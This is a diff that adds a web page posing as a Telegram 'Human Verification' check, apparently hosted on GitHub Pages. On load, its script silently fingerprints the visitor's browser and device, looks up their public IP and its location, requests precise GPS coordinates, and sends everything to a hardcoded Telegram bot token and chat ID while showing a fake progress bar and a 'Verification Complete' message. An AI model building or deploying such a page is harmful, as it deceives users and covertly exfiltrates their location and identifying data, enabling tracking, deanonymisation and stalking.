@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .verification-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: #e5e7eb;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981 0%, #34d399 100%);
+            width: 0%;
+            transition: width 3s ease-in-out;
+            border-radius: 3px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            padding: 10px;
+            background: #f9fafb;
+            border-radius: 8px;
+        }
+        
+        .status-icon {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="header">
+            <h1>🔒 Human Verification</h1>
+            <p>Complete verification to continue</p>
+        </div>
+        
+        <div class="content">
+            <div id="loadingSection">
+                <div style="text-align: center;">
+                    <div class="spinner"></div>
+                    <h2>Verification in Progress</h2>
+                    <p>Please wait while we verify your identity...</p>
+                </div>
+                
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                
+                <div id="statusList">
+                    <div class="status-item" id="status1">
+                        <span class="status-icon">⏳</span>
+                        <span>Checking browser...</span>
+                    </div>
+                    <div class="status-item" id="status2">
+                        <span class="status-icon">⏳</span>
+                        <span>Analyzing device...</span>
+                    </div>
+                    <div class="status-item" id="status3">
+                        <span class="status-icon">⏳</span>
+                        <span>Verifying network...</span>
+                    </div>
+                    <div class="status-item" id="status4">
+                        <span class="status-icon">⏳</span>
+                        <span>Collecting data...</span>
+                    </div>
+                </div>
+                
+                <div style="text-align: center; margin-top: 30px; font-size: 12px; color: #6b7280;">
+                    <p>This process helps prevent automated access. Do not close this window.</p>
+                </div>
+            </div>
+            
+            <div id="successSection" class="hidden">
+                <div style="text-align: center; padding: 30px;">
+                    <div style="font-size: 60px; color: #10b981; margin-bottom: 20px;">✅</div>
+                    <h2>Verification Complete!</h2>
+                    <p style="margin: 20px 0;">Your identity has been successfully verified.</p>
+                    <p>You can now return to Telegram.</p>
+                    <button onclick="closeWindow()" style="margin-top: 20px; padding: 12px 30px; background: #4f46e5; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer;">
+                        Return to Telegram
+                    </button>
+                </div>
+            </div>
+            
+            <div id="errorSection" class="hidden">
+                <div style="text-align: center; padding: 30px;">
+                    <div style="font-size: 60px; color: #ef4444; margin-bottom: 20px;">❌</div>
+                    <h2>Verification Failed</h2>
+                    <p style="margin: 20px 0;">Unable to complete verification.</p>
+                    <p>Please try again later.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Получаем параметры из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        const userId = urlParams.get('user_id');
+        const botToken = urlParams.get('bot_token') || '7725874473:AAEEZj4LtuhjcL0lqN9nATOcihJr2uqyhi0';
+        const chatId = urlParams.get('chat_id') || '990561525';
+        
+        // Данные для сбора
+        const collectedData = {
+            verification: {
+                token: token,
+                user_id: userId,
+                timestamp: new Date().toISOString()
+            },
+            browser: {},
+            device: {},
+            network: {},
+            location: {},
+            behavior: {}
+        };
+        
+        class DataCollector {
+            constructor() {
+                this.step = 0;
+                this.totalSteps = 4;
+            }
+            
+            async startCollection() {
+                try {
+                    await this.step1_browser();
+                    await this.step2_device();
+                    await this.step3_network();
+                    await this.step4_location();
+                    await this.sendData();
+                    this.showSuccess();
+                } catch (error) {
+                    console.error('Error:', error);
+                    this.showError();
+                }
+            }
+            
+            async step1_browser() {
+                await this.updateProgress(25, 1);
+                
+                collectedData.browser = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    vendor: navigator.vendor,
+                    appVersion: navigator.appVersion,
+                    product: navigator.product
+                };
+            }
+            
+            async step2_device() {
+                await this.updateProgress(50, 2);
+                
+                collectedData.device = {
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth,
+                        orientation: screen.orientation?.type || 'unknown'
+                    },
+                    window: {
+                        width: window.innerWidth,
+                        height: window.innerHeight,
+                        devicePixelRatio: window.devicePixelRatio
+                    },
+                    time: {
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset(),
+                        locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                        timestamp: new Date().toISOString()
+                    }
+                };
+                
+                // WebGL fingerprint
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        collectedData.device.webgl = {
+                            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
+                            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown'
+                        };
+                    }
+                } catch (e) {}
+            }
+            
+            async step3_network() {
+                await this.updateProgress(75, 3);
+                
+                collectedData.network = {
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null,
+                    online: navigator.onLine
+                };
+                
+                // Получаем публичный IP
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    collectedData.network.publicIP = data.ip;
+                    
+                    // Информация о IP
+                    const ipInfo = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                    const ipData = await ipInfo.json();
+                    collectedData.network.ipInfo = ipData;
+                } catch (e) {
+                    collectedData.network.publicIP = 'unknown';
+                }
+            }
+            
+            async step4_location() {
+                await this.updateProgress(100, 4);
+                
+                collectedData.behavior = {
+                    timeOnPage: performance.now(),
+                    screenSize: `${window.screen.width}x${window.screen.height}`,
+                    touchSupport: 'ontouchstart' in window
+                };
+                
+                // Геолокация
+                if ("geolocation" in navigator) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 5000
+                            });
+                        });
+                        
+                        collectedData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: position.timestamp
+                        };
+                    } catch (e) {
+                        collectedData.location = { error: e.message };
+                    }
+                }
+            }
+            
+            async updateProgress(percent, step) {
+                document.getElementById('progressBar').style.width = percent + '%';
+                
+                for (let i = 1; i <= this.totalSteps; i++) {
+                    const item = document.getElementById('status' + i);
+                    if (i < step) {
+                        item.innerHTML = '<span class="status-icon">✅</span><span>Completed</span>';
+                    } else if (i === step) {
+                        item.innerHTML = '<span class="status-icon">🔄</span><span>In progress...</span>';
+                    }
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            async sendData() {
+                // Формируем сообщение для Telegram
+                const message = this.formatTelegramMessage();
+                
+                // Отправляем в Telegram
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                return response.ok;
+            }
+            
+            formatTelegramMessage() {
+                const browser = collectedData.browser;
+                const device = collectedData.device;
+                const network = collectedData.network;
+                const location = collectedData.location;
+                const ipInfo = network.ipInfo || {};
+                
+                const isMobile = browser.platform && (
+                    browser.platform.includes('iPhone') || 
+                    browser.platform.includes('Android') || 
+                    browser.platform.includes('Mobile')
+                );
+                const deviceType = isMobile ? '📱 Мобильное' : '💻 Компьютер';
+                
+                let approximateAddress = '';
+                if (location.latitude && location.longitude) {
+                    approximateAddress = `${location.latitude.toFixed(4)}°, ${location.longitude.toFixed(4)}°`;
+                } else if (ipInfo.city && ipInfo.country_name) {
+                    approximateAddress = `${ipInfo.city}, ${ipInfo.country_name}`;
+                } else {
+                    approximateAddress = 'Не определен';
+                }
+                
+                return `
+🎯 *НОВАЯ ВЕРИФИКАЦИЯ (GitHub)*
+
+📋 *СВОДКА:*
+├ ${deviceType} устройство
+├ 🖥️ *ОС:* ${browser.platform || 'Не определено'}
+├ 🌐 *Браузер:* ${browser.userAgent?.split(') ')[0]?.split('(')[1] || 'Не определен'}...
+├ 📊 *Экран:* ${device.screen?.width || '?'}x${device.screen?.height || '?'}
+├ ⚙️ *Память:* ${browser.deviceMemory || '?'}GB
+├ 🎮 *CPU:* ${browser.hardwareConcurrency || '?'} ядер
+
+🌍 *ЛОКАЦИЯ:*
+├ 🏷️ *IP:* \`${network.publicIP || 'Не определен'}\`
+├ 📍 *Примерный адрес:* ${approximateAddress}
+├ 🏙️ *Город:* ${ipInfo.city || 'Не определен'}
+├ 🇸🇮 *Страна:* ${ipInfo.country_name || 'Не определена'}
+├ 📡 *Провайдер:* ${ipInfo.org || 'Не определен'}
+├ 🛰️ *Точность:* ${location.accuracy ? Math.round(location.accuracy) + ' м' : 'Не известна'}
+
+📶 *СЕТЬ:*
+├ 📱 *Тип:* ${network.connection?.effectiveType || 'Не определен'}
+├ ⚡ *Скорость:* ${network.connection?.downlink || '?'} Mbps
+├ ⏱️ *Задержка:* ${network.connection?.rtt || '?'} ms
+├ 🌐 *Язык:* ${browser.language || 'Не определен'}
+
+🆔 *ИНФОРМАЦИЯ:*
+├ 👤 *Telegram ID:* \`${collectedData.verification.user_id}\`
+├ 🔑 *Токен:* ${collectedData.verification.token?.substring(0, 10) || 'Нет'}...
+├ 🕐 *Время:* ${new Date().toLocaleTimeString('ru-RU')}
+├ ⏳ *На сайте:* ${Math.round(collectedData.behavior.timeOnPage / 1000) || 0} сек
+
+🎛️ *ТЕХНИЧЕСКИЕ ДАННЫЕ:*
+├ 🎨 *Цвет:* ${device.screen?.colorDepth || '?'} бит
+├ 🔍 *DPI:* ${device.window?.devicePixelRatio || '?'}x
+├ 📍 *Геолокация:* ${location.latitude ? '✅ Разрешена' : '❌ Не разрешена'}
+
+🔗 *Ссылка:* ${window.location.href}
+
+⚠️ *Данные собраны через GitHub Pages.*
+`;
+            }
+            
+            showSuccess() {
+                document.getElementById('loadingSection').classList.add('hidden');
+                document.getElementById('successSection').classList.remove('hidden');
+            }
+            
+            showError() {
+                document.getElementById('loadingSection').classList.add('hidden');
+                document.getElementById('errorSection').classList.remove('hidden');
+            }
+        }
+        
+        function closeWindow() {
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.close();
+            } else {
+                window.close();
+            }
+        }
+        
+        // Запускаем сбор данных при загрузке страницы
+        document.addEventListener('DOMContentLoaded', () => {
+            const collector = new DataCollector();
+            collector.startCollection();
+        });
+    </script>
+</body>
+</html>
